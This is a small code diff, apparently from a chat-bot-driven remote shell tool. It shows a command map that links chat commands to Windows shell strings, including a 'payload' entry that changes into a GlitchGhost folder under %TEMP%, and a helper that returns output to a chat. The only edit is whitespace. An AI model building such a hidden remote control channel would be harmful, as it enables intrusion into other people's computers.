@@ -18,7 +18,7 @@ command_map = {
     "disconnect": "^c",
     "back": "cd ..",
     "payload": "cd %TEMP%\pload\GlitchGhost-main",
-}
+} 
 
 # Function to send output in chunks if it exceeds max message length
 async def send_output_in_chunks(chat_id, text, context):
